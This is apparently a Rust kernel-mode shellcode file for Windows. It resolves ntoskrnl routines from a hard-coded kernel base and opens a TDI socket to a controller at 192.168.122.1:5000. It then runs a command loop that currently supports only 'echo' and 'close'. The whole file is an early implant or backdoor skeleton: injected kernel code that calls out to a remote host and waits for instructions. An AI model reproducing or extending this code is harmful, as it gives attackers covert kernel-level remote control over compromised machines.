#![no_std]
#![feature(asm)]
#![feature(core_intrinsics)]
use core::arch::asm;

#[repr(u32)]
enum ScrapeType {
    Module = 0,
    Memory = 1,
}

#[repr(C, packed)]
struct ScrapeInfo {
    scrape_type: ScrapeType,
    size: u32,
    address: u64,
}

#[no_mangle]
unsafe extern "stdcall"
fn _DllMainCRTStartup(
    _hinst_dll: *const u8,
    _fdw_reason: u32,
    _lpv_reserved: *const u8
) -> u64
{
    match shellcode_start() {
        Ok(_) => 0,
        Err(x) => x as _,
    }
}

unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
    // let nt_base = resolver::find_nt_base_address();
    let nt_base: ntdef::types::PVOID;
	asm!(
		"mov {0}, 0xfffff8024f205000",
		out(reg) nt_base
	);

    let ex_allocate_pool: ntdef::functions::ExAllocatePool = ntproc::find!("ExAllocatePool");

    let tdi_ctx: *mut nttdi::TdiContext = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<nttdi::TdiContext>()
    ) as _;

    (*tdi_ctx).funcs.ex_allocate_pool =                     ex_allocate_pool;
    (*tdi_ctx).funcs.ex_free_pool_with_tag =                ntproc::find!("ExFreePoolWithTag");
    (*tdi_ctx).funcs.io_allocate_mdl =                      ntproc::find!("IoAllocateMdl");
    (*tdi_ctx).funcs.io_build_device_io_control_request =   ntproc::find!("IoBuildDeviceIoControlRequest");
    (*tdi_ctx).funcs.io_get_related_device_object =         ntproc::find!("IoGetRelatedDeviceObject");
    (*tdi_ctx).funcs.iof_call_driver =                      ntproc::find!("IofCallDriver");
    (*tdi_ctx).funcs.ke_initialize_event =                  ntproc::find!("KeInitializeEvent");
    (*tdi_ctx).funcs.ke_wait_for_single_object =            ntproc::find!("KeWaitForSingleObject");
    (*tdi_ctx).funcs.ob_reference_object_by_handle =        ntproc::find!("ObReferenceObjectByHandle");
    (*tdi_ctx).funcs.zw_create_file =                       ntproc::find!("ZwCreateFile");
    (*tdi_ctx).funcs.mm_probe_and_lock_pages =              ntproc::find!("MmProbeAndLockPages");
    (*tdi_ctx).funcs.ke_raise_irql_to_dpc_level =           ntproc::find!("KeRaiseIrqlToDpcLevel");
    (*tdi_ctx).funcs.ke_lower_irql =                        ntproc::find!("KeLowerIrql");

    (*tdi_ctx).sync = 0u32;
    (*tdi_ctx).msg_available = 0u32;

    use nttdi::Socket;
    let mut socket = nttdi::TdiSocket::new(tdi_ctx);
    socket.add_recv_handler(recv_handler);
    // socket.connect(0xdd01a8c0, 0xBCFB)?;  // 192.168.1.221:64444
    socket.connect(0x017aa8c0, 0x8813)?;  // 192.168.122.1:5000

    let hello = [0x68u8, 0x65u8, 0x6cu8, 0x6cu8, 0x6fu8, 0x0au8];
	let _ = socket.send(&hello as *const u8, 6 as _);

    let mut kirql: ntdef::types::KIRQL;
    let mut buf: ntdef::types::PVOID = ntdef::enums::NULL;
    let mut buf_len: u32 = 0;
    let mut exec: u32 = 0 as _;

    let mut close: u8 = 0;
    while close == 0u8 {
        while (*tdi_ctx).msg_available == 0u32 {
            asm!("nop");
        }
        kirql = ((*tdi_ctx).funcs.ke_raise_irql_to_dpc_level)();
        acquire_spinlock(&mut (*tdi_ctx).sync);
        if (*tdi_ctx).msg_available == 1u32 {
            buf = ((*tdi_ctx).funcs.ex_allocate_pool)(
                ntdef::enums::POOL_TYPE::NonPagedPool, (*tdi_ctx).buf_len as _);
            buf_len = (*tdi_ctx).buf_len as _;
            ntdef::macros::RtlCopyMemory(buf as _, (*tdi_ctx).app_buffer as _, buf_len as _);
            ((*tdi_ctx).funcs.ex_free_pool_with_tag)((*tdi_ctx).app_buffer, 0);
            exec = 1 as _;
            (*tdi_ctx).msg_available = 0u32;
        }
        (*tdi_ctx).sync = 0u32;
        ((*tdi_ctx).funcs.ke_lower_irql)(kirql);
        if exec == 1u32 {
            let echo_cmd = [0x65u8, 0x63u8, 0x68u8, 0x6fu8, 0x20u8];
            let close_cmd = [0x63u8, 0x6cu8, 0x6fu8, 0x73u8, 0x65u8, 0x0au8];
            if ntdef::macros::RtlEqualMemory(buf as _, &echo_cmd as _, 5) == 1u32 {
                // let _ = socket.send(buf.offset(5) as *const u8, buf_len - 5);
                let _ = socket.send((buf as *const u8).offset(5) as *const u8, buf_len - 5);
            } else if ntdef::macros::RtlEqualMemory(buf as _, &close_cmd as _, 6) == 1u32 {
                _ = socket.close();
                close = 1 as _;
            } else {
                let invalid_cmd = [0x69u8, 0x6eu8, 0x76u8, 0x61u8, 0x6cu8, 0x69u8, 0x64u8, 0x20u8, 0x63u8, 0x6fu8, 0x6du8, 0x6du8, 0x61u8, 0x6eu8, 0x64u8, 0x0au8];
                let _ = socket.send(&invalid_cmd as *const u8, 16 as _);
            }
            ((*tdi_ctx).funcs.ex_free_pool_with_tag)(buf, 0);
            exec = 0 as _;
        }
    }
    // this is to avoid errors if returning to a cleaning-up module
    _ = ((*tdi_ctx).funcs.ke_raise_irql_to_dpc_level)();
    Ok(())
}

// called at DISPATCH_LEVEL
unsafe fn recv_handler(
    _tdi_event_context:      ntdef::types::PVOID,
    _connection_context:     ntdef::types::PVOID,
    _receive_flags:          ntdef::types::ULONG,
    _bytes_indicated:        ntdef::types::ULONG,
    bytes_available:        ntdef::types::ULONG,
    bytes_taken:            *mut ntdef::types::ULONG,
    _buffer:                 ntdef::types::PVOID,
    irp:                    *mut ntdef::structs::PIRP,
) -> ntdef::types::NTSTATUS {
    //core::intrinsics::breakpoint();

    *bytes_taken = bytes_available;
    *irp = core::ptr::null_mut();

    let tdi_ctx: *mut nttdi::TdiContext = _tdi_event_context as _;

    acquire_spinlock(&mut (*tdi_ctx).sync);
    if (*tdi_ctx).msg_available == 0u32 {
        let out = ((*tdi_ctx).funcs.ex_allocate_pool)(ntdef::enums::POOL_TYPE::NonPagedPool, _bytes_indicated as _);
        ntdef::macros::RtlCopyMemory(out as _, _buffer as _, _bytes_indicated as _);
        (*tdi_ctx).app_buffer = out as _;
        (*tdi_ctx).buf_len = _bytes_indicated;
        (*tdi_ctx).msg_available = 1u32;
    }
    (*tdi_ctx).sync = 0u32;

    ntdef::enums::NTSTATUS::STATUS_SUCCESS as _
}


unsafe fn acquire_spinlock(sync: *mut u32) {
    let _key: u32;
    asm!(
        "3:",
        "mov {0:e}, 1",
        "xchg {0:e}, DWORD PTR[{1}]",
        "test {0:e}, {0:e}",    
        "jnz 3b",
        out(reg) _key,
        in(reg) sync
    );
}


#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {
    }
}
